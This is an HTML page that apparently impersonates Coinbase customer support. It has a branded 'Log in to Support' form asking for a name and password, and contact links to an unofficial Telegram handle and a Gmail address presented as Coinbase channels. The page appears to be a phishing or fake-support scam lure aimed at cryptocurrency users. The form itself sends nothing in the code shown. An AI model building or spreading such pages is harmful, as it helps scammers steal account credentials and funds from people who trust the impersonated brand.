
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Coinbase Support</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #0e1320;
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .login-box {
      margin-top: 40px;
      background-color: #1b2233;
      padding: 40px;
      border-radius: 10px;
      text-align: center;
      width: 100%;
      max-width: 400px;
    }
    .login-box input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: #3b82f6;
      border: none;
      border-radius: 5px;
      color: white;
      font-size: 16px;
    }
    .contact-options {
      margin-top: 30px;
      text-align: center;
    }
    .contact-options a {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      margin: 5px;
      color: white;
      text-decoration: none;
    }
    .contact-options img {
      width: 20px;
      height: 20px;
    }
  </style>
</head>
<body>
  <img src="coinbase.png" alt="Coinbase Logo" style="width:150px;margin-bottom:20px;" />
  <div class="login-box">
    <h2>Log in to Support</h2>
    <input type="text" placeholder="Name" />
    <input type="password" placeholder="Password" />
    <button>Log In</button>
  </div>
  <div class="contact-options">
    <h3>Contact Options</h3>
    <a href="https://t.me/coinbaseeuropesupport"><img src="telegram.png" alt="Telegram Icon" />Contact via Telegram</a>
    <a href="mailto:CoinbaseEuropeSafety@gmail.com"><img src="email.png" alt="Email Icon" />Contact via Email</a>
  </div>
</body>
</html>
